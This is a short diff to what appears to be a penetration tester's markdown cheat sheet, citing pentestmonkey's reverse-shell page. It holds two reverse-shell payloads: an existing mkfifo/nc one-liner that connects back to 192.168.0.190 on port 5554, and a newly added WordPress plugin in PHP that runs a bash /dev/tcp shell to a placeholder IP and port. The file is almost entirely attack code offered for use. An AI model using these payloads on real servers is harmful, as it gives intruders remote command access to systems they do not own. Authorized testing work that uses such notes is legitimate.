@@ -11,3 +11,16 @@ https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 ```
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
 ```
+
+
+#### PHP
+
+```
+<?php
+/**
+ * Plugin Name: Wordpress Reverse Shell
+ * Author: azkrath
+ */
+exec(“/bin/bash -c ‘bash -i >& /dev/tcp/<IP>/<Port> 0>&1’”)
+?>
+```
